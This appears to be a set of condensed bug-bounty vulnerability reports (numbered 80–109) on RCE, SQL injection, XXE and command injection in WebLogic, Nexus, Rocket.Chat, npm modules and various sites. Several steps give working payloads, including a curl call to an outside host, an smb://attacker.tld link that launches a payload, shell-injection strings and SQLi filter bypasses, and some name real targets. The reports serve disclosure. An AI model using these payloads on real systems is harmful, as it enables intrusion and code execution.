Report 80: Server Side JavaScript Code Injection
================================================================================
Vulnerability Description:
The vulnerability is a Server Side JavaScript Code Injection in fastify, where an attacker controlling a property name in the serialization schema can achieve Remote Command Execution in the context of the web server.

Steps to Reproduce:
1. Identify a property name in the serialization schema that can be controlled by an attacker
2. Inject malicious JavaScript code into the controlled property name during schema definition

--------------------------------------------------------------------------------

Report 81: LFI with potential to RCE on ██████ using CVE-2019-3396
================================================================================
Vulnerability Description:
This vulnerability is a Local File Inclusion (LFI) in a web application that uses a specific macro preview feature. By manipulating the '_template' parameter in the JSON payload, an attacker can read arbitrary files from the server's filesystem. This could potentially lead to Remote Code Execution (RCE) if the attacker can access and manipulate critical files.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint with a malicious JSON payload that includes a file path in the '_template' parameter.
2. Observe the server's response, which may include the contents of the specified file, indicating successful Local File Inclusion (LFI).

--------------------------------------------------------------------------------

Report 82: Remote Code Execution via Extract App Plugin
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in the Nextcloud Extract plugin due to improper sanitization of user input in the 'unrar' command execution. An attacker can inject arbitrary commands via the 'nameOfFile' parameter, leading to full system compromise.

Steps to Reproduce:
1. Install the Extract plugin from the Nextcloud Apps menu.
2. Upload a RAR file and use the 'Extract Here' functionality while intercepting the request with a tool like BurpSuite.
3. Modify the 'nameOfFile' parameter in the intercepted request to include a command injection payload.
4. Execute the payload to download and run a reverse shell script on the server.

--------------------------------------------------------------------------------

Report 83: RCE on █████ via CVE-2017-10271
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in Oracle WebLogic Server via CVE-2017-10271. It allows an attacker to execute arbitrary Java code by sending a crafted SOAP request to a vulnerable endpoint. The proof of concept demonstrates this by causing the server to sleep for 12 seconds.

Steps to Reproduce:
1. Send a crafted SOAP request to the vulnerable WebLogic server endpoint at /wls-wsat/RegistrationPortTypeRPC with a sleep payload.
2. Observe the delayed response (12 seconds in this case) to confirm Java code execution.

--------------------------------------------------------------------------------

Report 84: MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass
================================================================================
Vulnerability Description:
The vulnerability is an MSSQL injection via the 'Customwho' parameter in the specified URL, which allows an attacker to execute arbitrary SQL queries. The presence of a WAF can be bypassed, potentially leading to data manipulation or RCE.

Steps to Reproduce:
1. Identify the vulnerable parameter 'Customwho' in the URL: https://█████/News/Transcripts/Search/Sort/
2. Inject a SQL query using the 'Customwho' parameter to test for SQL injection, e.g., https://█████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@LANGID
3. Confirm the database is MSSQL by observing the response to the injected query with @@LANGID
4. Attempt to bypass the WAF by using non-existing global variables or other bypass techniques, e.g., https://██████████/News/Transcripts/Search/Sort/?Customwho=31002//|//@@nonexisting

--------------------------------------------------------------------------------

Report 85: Monero Wallet Gui for Windows (Arbitrary Code Execution)
================================================================================
Vulnerability Description:
The Windows version of monero-wallet-gui.exe is vulnerable to arbitrary code execution due to DLL hijacking via a missing OpenSSL configuration file. A low-privileged user can plant malicious DLLs in a writable path that the application attempts to load, leading to code execution with administrator privileges.

Steps to Reproduce:
1. Download and extract monero-gui-win-x64-v0.14.0.0.zip to the C: drive.
2. Create the folder structure C:\monero-gui-win-x64-v0.14.0.0\ssl and place malicious openssl.cnf and .dll files in it.
3. Execute monero-wallet-gui.exe as an administrator, triggering the malicious .dll.

--------------------------------------------------------------------------------

Report 86: Root Remote Code Execution on https://███
================================================================================
Vulnerability Description:
Atlassian Crowd has a vulnerability (CVE-2019-11580) where the pdkinstall development plugin is incorrectly enabled in release builds, allowing unauthenticated or authenticated attackers to install arbitrary plugins leading to remote code execution as root.

Steps to Reproduce:
1. Download and unzip the malicious plugin: rce-plugin.zip
2. Run the curl command to upload the plugin to the vulnerable Crowd instance: curl -k -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://███/crowd/admin/uploadplugin.action
3. Visit the malicious plugin URL to execute arbitrary commands as root: https://███████/crowd/plugins/servlet/hackerone-cdl

--------------------------------------------------------------------------------

Report 87: Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ [CVE-2017-10352]
================================================================================
Vulnerability Description:
The vulnerability is a Remote OS Command Execution (RCE) in outdated Oracle WebLogic instances due to improper handling of XML data in SOAP requests. Attackers can exploit this by sending crafted SOAP requests that trigger command execution on the server.

Steps to Reproduce:
1. Send a POST request to the vulnerable WebLogic endpoint '/wls-wsat/CoordinatorPortType' with a crafted SOAP envelope containing a sleep command in the WorkContext header.
2. Send another POST request to the same endpoint with a different crafted SOAP envelope containing an OS command (e.g., nslookup to a Burp Collaborator domain) in the WorkContext header to demonstrate command execution.

--------------------------------------------------------------------------------

Report 88: OS Command Injection in Nexus Repository Manager 2.x
================================================================================
Vulnerability Description:
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution via OS Command Injection. An authenticated user with sufficient privileges can exploit this by manipulating the path of 'createrepo' or 'mergerepo' in the Yum Configuration Capability to execute arbitrary commands on the underlying operating system.

Steps to Reproduce:
1. Navigate to 'Capabilities' in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., C:\Windows\System32\calc.exe).
3. The OS command will execute as the SYSTEM user, as Nexus appends --version to the OS command.

--------------------------------------------------------------------------------

Report 89: OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)
================================================================================
Vulnerability Description:
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution due to incomplete filtering in the getCleanCommand method, allowing an authenticated user with sufficient privileges to execute arbitrary OS commands.

Steps to Reproduce:
1. Navigate to 'Capabilities' in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo).

--------------------------------------------------------------------------------

Report 90: [tree-kill] RCE via insecure command concatenation (only Windows)
================================================================================
Vulnerability Description:
The tree-kill module on Windows is vulnerable to Remote Code Execution (RCE) due to insecure command concatenation of user input without proper sanitization. This allows an attacker to inject arbitrary commands that will be executed on the victim's system.

Steps to Reproduce:
1. Install the vulnerable module: npm i tree-kill
2. Run the PoC script: node poc.js (where poc.js contains the malicious command injection)

--------------------------------------------------------------------------------

Report 91: [treekill] RCE via insecure command concatenation (only Windows)
================================================================================
Vulnerability Description:
The treekill module for Node.js is vulnerable to Remote Code Execution (RCE) on Windows due to insecure command concatenation. User input is directly concatenated into a command that is executed without proper sanitization, allowing an attacker to inject arbitrary commands.

Steps to Reproduce:
1. Install the vulnerable module: npm i tree-kill
2. Create a PoC file (poc.js) with the following content:
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
3. Run the PoC: node poc.js
4. Verify the attack by checking if HACKED.txt was created: dir

--------------------------------------------------------------------------------

Report 92: [HTA2] XXE on https://███ via SpellCheck Endpoint.
================================================================================
Vulnerability Description:
The vulnerability is an XML External Entity (XXE) attack that allows an attacker to read local files, make HTTP requests to internal applications, and potentially steal NTLM hashes by exploiting a spell check endpoint that processes XML input without proper sanitization.

Steps to Reproduce:
1. Log into the target system with provided credentials to obtain session cookies.
2. Send a crafted XML request with an external entity reference to the spell check endpoint to read local files or make HTTP requests.

--------------------------------------------------------------------------------

Report 93: Path traversal, to RCE
================================================================================
Vulnerability Description:
A path traversal vulnerability in GitLab's package registry API allows an attacker to write arbitrary files to any location writable by the GitLab user, potentially leading to remote code execution by overwriting critical files like authorized_keys.

Steps to Reproduce:
1. Enable package registry in your GitLab instance and create a project (package registry is enabled by default).
2. Create a private token to call the API and send a crafted request with path traversal to write a file (e.g., authorized_keys) to a sensitive location.

--------------------------------------------------------------------------------

Report 94: Public instance of Jenkins on https://██████████/ with /script enabled
================================================================================
Vulnerability Description:
An unauthenticated Jenkins instance with /script enabled allows attackers to execute arbitrary commands on the server, potentially leading to critical information leakage and server compromise.

Steps to Reproduce:
1. Go to https://███/script/ and check the SSL certificate for proof.
2. In the textbox that appears, enter the following code: "ls /".execute().text to list the root directory contents.

--------------------------------------------------------------------------------

Report 95: Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]
================================================================================
Vulnerability Description:
This vulnerability allows remote OS command execution on an outdated Oracle WebLogic server via CVE-2017-3506. An attacker can execute arbitrary commands by sending a specially crafted SOAP request to the WebLogic server's RegistrationRequesterPortType endpoint.

Steps to Reproduce:
1. Send a POST request to https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType with a crafted SOAP envelope containing a ProcessBuilder object.
2. The crafted SOAP envelope includes a command to execute a ping or nslookup with a subdomain containing the output of the 'whoami' command, sent to a Burp Collaborator instance or private VPS.

--------------------------------------------------------------------------------

Report 96: [logkitty] RCE via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) issue in the logkitty module, where user input is formatted inside a command that is executed without proper sanitization or checks. This allows an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. npm i logkitty
2. logkitty android app 'test; touch HACKED'

--------------------------------------------------------------------------------

Report 97: XXE through injection of a payload in the XMP metadata of a JPEG file
================================================================================
Vulnerability Description:
The vulnerability is an XML External Entity (XXE) attack through the injection of a payload in the XMP metadata of a JPEG file uploaded as an avatar. The server processes the malicious metadata, leading to arbitrary file reads or directory listings on the server's filesystem.

Steps to Reproduce:
1. Upload a JPEG file containing a malicious XMP metadata payload to the avatar upload functionality.
2. Monitor the Burp Collaborator or similar service for HTTP requests from the server, indicating successful XXE exploitation.

--------------------------------------------------------------------------------

Report 98: [www.zomato.com] Blind SQL Injection in /php/geto2banner
================================================================================
Vulnerability Description:
The vulnerability is a Blind SQL Injection in the /php/geto2banner endpoint of www.zomato.com, where the res_id parameter is not properly sanitized, allowing an attacker to execute arbitrary SQL queries and potentially extract sensitive data from the database.

Steps to Reproduce:
1. Send a POST request to /php/geto2banner with a manipulated res_id parameter containing a SQL injection payload.
2. Observe the response time to determine if the SQL injection was successful (e.g., delayed response indicates a successful injection).

--------------------------------------------------------------------------------

Report 99: Desktop app RCE (#276031 bypass)
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution in the Rocket.Chat desktop app by bypassing a previous fix (#276031) through manipulation of the RegExp.prototype.test method. This enables an attacker to execute arbitrary code on the victim's machine by tricking them into clicking a malicious link or adding a self-hosted server.

Steps to Reproduce:
1. Create a web page with the provided HTML code that includes a malicious script to rewrite RegExp.prototype.test and trigger a click event.
2. Host the web page and ensure the victim interacts with it, causing the Rocket.Chat desktop app to execute arbitrary code via shell.openExternal.

--------------------------------------------------------------------------------

Report 100: Code injection possible with malformed Nextcloud Talk chat commands
================================================================================
Vulnerability Description:
The vulnerability allows for arbitrary code execution in Nextcloud Talk by exploiting malformed chat commands. Attackers can inject bash subcommands into command arguments, leading to remote code execution and potential full system compromise.

Steps to Reproduce:
1. Install and setup Nextcloud with Talk app and sample commands
2. Upload a malicious script to a user's Nextcloud files
3. Use chat commands with bash subcommand syntax to execute arbitrary commands (e.g., /wiki test $(id))
4. Use the command execution to locate and modify the uploaded script
5. Execute the script to establish a reverse shell

--------------------------------------------------------------------------------

Report 101: SQL Injection or Denial of Service due to a Prototype Pollution
================================================================================
Vulnerability Description:
The vulnerability is a prototype pollution in TypeORM's mergeDeep function, which fails to properly handle built-in properties like __proto__. This allows attackers to modify the Object prototype, potentially leading to SQL injection or denial of service by altering application logic.

Steps to Reproduce:
1. Create a malicious object with prototype pollution (e.g., using __proto__ to inject properties)
2. Pass the malicious object to TypeORM's mergeDeep function (either directly or through a save operation)

--------------------------------------------------------------------------------

Report 102: Dashboard sharing enables code injection into ████ emails
================================================================================
Vulnerability Description:
An attacker can inject HTML into dashboard sharing emails, allowing them to craft spearphishing emails that appear to come from a trusted source within the organization. This is due to insufficient sanitization of HTML tags in the message field before sending the email.

Steps to Reproduce:
1. Create an account or sign into the target platform.
2. Navigate to the dashboard creation section and create a new dashboard.
3. Click the share icon on the dashboard and select 'Add groups and users'.
4. Enter the name of an account you own in the 'To:' field.
5. Check the 'Send an email invitation' box and inject HTML into the 'Message' field.
6. Click 'Share' to send the email with the injected HTML.

--------------------------------------------------------------------------------

Report 103: [meemo-app] Denial of Service via LDAP Injection
================================================================================
Vulnerability Description:
The vulnerability is a Denial of Service (DoS) via LDAP Injection in the meemo-app module. It occurs when a malicious attacker sends a crafted input that is interpreted as an LDAP filter, causing the server to consume excessive resources and crash.

Steps to Reproduce:
1. Set up a local environment with MongoDB, Meemo app, and LDAP test server
2. Send a crafted LDAP injection payload to the login endpoint to trigger the DoS

--------------------------------------------------------------------------------

Report 104: Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE
================================================================================
Vulnerability Description:
The Rocket.Chat Desktop app insecurely uses Electron's shell.openExternal() function to handle clicked links, allowing an attacker to craft a malicious link that, when clicked, executes arbitrary code on the user's system. The vulnerability arises from insufficient URL filtering, which only blocks file:// links but allows other dangerous protocols like smb://.

Steps to Reproduce:
1. Install Rocket.Chat Desktop on Xubuntu 20.04.
2. Login and join a channel.
3. From another account in the same channel, send a message with a crafted link: smb://attacker.tld/public/pwn.desktop
4. Click the link and confirm starting the untrusted launcher if prompted.
5. Observe the calculator and message box appearing, confirming remote code execution.

--------------------------------------------------------------------------------

Report 105: SQL injection [futexpert.mtngbissau.com]
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the 'phone_number' parameter of the /signin/ endpoint. The attacker can manipulate the SQL query by injecting malicious SQL code, which can lead to unauthorized access to the database or other malicious activities.

Steps to Reproduce:
1. Send a POST request to /signin/ with the payload containing SQL injection in the 'phone_number' parameter.
2. Observe the response time to confirm the SQL injection vulnerability based on the sleep commands in the payload.

--------------------------------------------------------------------------------

Report 106: [systeminformation] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a command injection in the systeminformation package where an attacker can concatenate curl parameters to overwrite a JavaScript file of the package and then execute arbitrary OS commands. The issue arises from the use of child_process.exec() with insufficient input sanitization.

Steps to Reproduce:
1. Set up a Netcat server to serve a malicious JavaScript file on port 443.
2. Use the systeminformation package's inetChecksite function to overwrite the package's JavaScript file with the malicious one via a crafted URL.
3. Execute arbitrary OS commands by calling the overwritten function in the systeminformation package.

--------------------------------------------------------------------------------

Report 107: GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
================================================================================
Vulnerability Description:
GitLab-Runner on Windows is vulnerable to Command Injection via the DOCKER_AUTH_CONFIG build variable. This allows an attacker to execute arbitrary commands on the container host by exploiting path traversal in the Credential Helper values, which are processed unsanitized.

Steps to Reproduce:
1. Register and run a GitLab Runner on a Windows system with a docker executor and a specific tag (e.g., windows-docker-runner).
2. Create a Build with a .gitlab-ci.yml file containing a malicious DOCKER_AUTH_CONFIG variable that specifies a path traversal to an executable (e.g., calc.exe).

--------------------------------------------------------------------------------

Report 108: [curling] Remote Code Execution
================================================================================
Vulnerability Description:
The curling module's regular expression does not properly validate input, allowing command injection via curl. This can be exploited to read or overwrite files on the system.

Steps to Reproduce:
1. Install the curling module: npm i curling
2. Create and run the following POC index.js:
const curling = require('curling');
curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});

--------------------------------------------------------------------------------

Report 109: SQLi in login form of █████
================================================================================
Vulnerability Description:
The login form is vulnerable to blind SQL injection due to improper input sanitization, allowing an attacker to infer database structure and extract information through differential responses (302 vs 500 errors). The attack requires bypassing space character filtering using /**/ comments.

Steps to Reproduce:
1. Send a POST request to the vulnerable login form with a crafted SQLi payload replacing spaces with /**/ to bypass filtering, e.g., usr='/**/or/**/lastName!='&pwd=████████
2. Observe the response codes (302 for valid SQL conditions, 500 for invalid) to infer database structure and perform blind SQLi

--------------------------------------------------------------------------------



